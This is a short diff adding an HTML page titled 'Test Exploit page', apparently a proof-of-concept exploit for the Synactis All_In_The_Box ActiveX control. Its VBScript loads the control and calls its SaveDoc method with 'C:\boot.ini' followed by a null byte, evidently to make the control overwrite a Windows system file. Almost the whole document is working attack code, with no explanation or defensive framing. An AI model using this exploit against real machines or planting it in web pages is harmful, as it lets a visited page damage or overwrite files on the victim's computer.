@@ -1,0 +1,14 @@
+&lt;html&gt;
+Test Exploit page
+&lt;object classid=&#039;clsid:B5576893-F948-4E0F-9BE1-A37CB56D66FF&#039; id=&#039;sh2kerr&#039; &gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+
+targetFile = &quot;C:\PROGRA~1\Synactis\ALLIN-~1\ALL_IN~1.OCX&quot;
+prototype  = &quot;Sub SaveDoc ( ByVal aFileName As String )&quot;
+memberName = &quot;SaveDoc&quot;
+progid     = &quot;All_In_The_Box.AllBox&quot;
+argCount   = 1
+arg1=&quot;C:\boot.ini&quot;+unescape(&quot;%00&quot;)
+sh2kerr.SaveDoc arg1
+&lt;/script&gt;
+&lt;/html&gt;
